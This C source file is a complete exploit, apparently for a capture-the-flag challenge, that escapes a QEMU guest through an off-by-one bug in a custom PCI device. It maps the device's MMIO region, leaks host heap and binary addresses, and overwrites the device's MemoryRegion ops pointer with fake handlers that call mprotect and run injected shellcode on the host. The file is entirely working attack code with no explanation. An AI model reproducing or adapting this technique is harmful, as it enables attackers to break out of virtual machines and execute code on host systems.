#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <math.h>

// Device sizes
#define MMIO_RESOURCE_SIZE 0x10000
#define BUFF_SIZE 0x10000
#define MAX_BASE 20
#define MAX_RW BUFF_SIZE - (int)(pow(MAX_BASE,3)*0x7 + pow(MAX_BASE,2)*0xF + MAX_BASE*0xF + 0xF - 1)
#define MREG_SIZE 0x110
#define PCI_SIZE 0xa30

// Binary offsets
#define BIN_OPS_OFF 0x14f7460
#define BIN_MPROT_PLT_OFF 0x31fff0

// MemoryRegion offsets
#define MREG_OWNER_OFF 0x40
#define MREG_OPS_OFF 0x50
#define MREG_OPAQUE_OFF 0x58

enum rwOps{
    trigger = 0x0,
    base = 0x4,
    offset = 0x8,
    src = 0x0c,
    test = 0x10
};

extern char shellcode[], end[];
#define SHELLCODE_SIZE (end - shellcode)

volatile char *mapped_resource;
char *gva_buff;
uint64_t gpa_buff;

uint32_t mmio_read(uint64_t offset){return *(uint32_t*)(mapped_resource+offset);}
void     mmio_write(uint64_t offset, uint32_t value){*(uint32_t*)(mapped_resource+offset) = value;}

void init_mmio_resource(char * resource_path)
{
    int fd = open(resource_path, O_RDWR | O_SYNC);
	if (fd < 0) err(EXIT_FAILURE, "open pci");

	mapped_resource = mmap(0, MMIO_RESOURCE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (mapped_resource == MAP_FAILED) err(EXIT_FAILURE, "mmap");

    close(fd);

	printf("[*] %s: %p\n", "GVA of io mapping", (void *)mapped_resource);
    printf("[*] %s: %x\n", "value ==>", mmio_read(test));
}


uint64_t _gva2gpa(char *addr)
{
    uint64_t page = 0;

    // access page because virtual memory is on demand and it may not be mapped already
    char tmp = *addr; 

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) err(-1, "open gva2gpa");

    lseek(fd, ((uint64_t)addr / 0x1000) * 8, SEEK_SET); // 0x1000 is the page size
    read(fd, &page, 8);
    close(fd);

    return ((page & 0x7fffffffffffff) * 0x1000) | ((uint64_t)addr & 0xfff);
}

void setup_guest_mapping()
{
    gva_buff = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
   	if (gva_buff == MAP_FAILED) err(EXIT_FAILURE, "mmap");

    gpa_buff = _gva2gpa(gva_buff);

	printf("[*] %s: %p\n", "GVA of buffer", gva_buff);
	printf("[*] %s: %p\n", "GPA of buffer", (void *) gpa_buff);
}

void set_arb_base(char b)
{
	mmio_write(src, (uint32_t)gpa_buff);
	mmio_write(offset, SHRT_MAX);
	mmio_write(base, MAX_BASE);

	gva_buff[MAX_RW-1] = b;

	mmio_write(trigger, 0);	// OffByOne -> base = b (even if b > MAX_BASE)
}

void set_arb_offset(short off)
{
	
	set_arb_base(MAX_BASE+1);

	*(short *)(gva_buff+MAX_RW-2) = off;
	
	mmio_write(offset, 0x6f6b);
	mmio_write(trigger, 0); // set offset to be any value (including negatives)
	mmio_write(base, 0x10); // set base to 0x10 to interpret offset correctly
}

void get_leaks(char **hva_mprotect_plt, char **hva_qmemu_buff)
{
	char *ops_ptr, *pie_base;

	set_arb_offset(-MREG_SIZE);
	mmio_read(trigger);

	char *hva_device = *(void **)(gva_buff + MREG_OWNER_OFF);
	printf("[*] %s: %p\n", "HVA of device (heap)", hva_device);

	char *hva_ops = *(void **)(gva_buff + MREG_OPS_OFF);
	printf("[*] %s: %p\n", "HVA of ops (pie)", hva_ops);

	char *hva_pie_base = hva_ops - BIN_OPS_OFF;
	printf("[*] %s: %p\n", "HVA pie base", hva_pie_base);

	*hva_mprotect_plt = hva_pie_base + BIN_MPROT_PLT_OFF;
	printf("[*] %s: %p\n", "Host virtual memory ptr of mprotect plt", *hva_mprotect_plt);

	*hva_qmemu_buff = hva_device + PCI_SIZE + MREG_SIZE;
	printf("[*] %s: %p\n", "Host virtual memory ptr of buffer", *hva_qmemu_buff);
}

void setup_fake_ops(char *hva_mprotect_plt, char *hva_qmemu_buff)
{
	*(void **)(gva_buff + MREG_SIZE) = hva_qmemu_buff+0x60; // fake read
	*(void **)(gva_buff + MREG_SIZE + 0x8) = hva_mprotect_plt; // fake write
	memcpy(gva_buff + MREG_SIZE+0x60, shellcode, SHELLCODE_SIZE);
}

void overwrite_ops(char *hva_mprotect_plt, char *hva_qmemu_buff)
{
	setup_fake_ops(hva_mprotect_plt, hva_qmemu_buff);
	*(void **)(gva_buff + MREG_OPS_OFF) = hva_qmemu_buff;
	*(void **)(gva_buff + MREG_OPAQUE_OFF) = (void *)(((uint64_t)hva_qmemu_buff+0x60)/0x1000*0x1000);
	mmio_write(trigger, 0);
}

uint64_t main()
{

	init_mmio_resource("/sys/devices/pci0000:00/0000:00:04.0/resource0");
	setup_guest_mapping();

	char *hva_mprotect_plt, *hva_qmemu_buff;
	get_leaks(&hva_mprotect_plt, &hva_qmemu_buff);

	overwrite_ops(hva_mprotect_plt, hva_qmemu_buff);

	// call mprotect 
	mmio_write(0x1000,  PROT_READ | PROT_WRITE | PROT_EXEC);
	// win :)
	puts("[*] PWNED!");
	mmio_read(trigger);
}
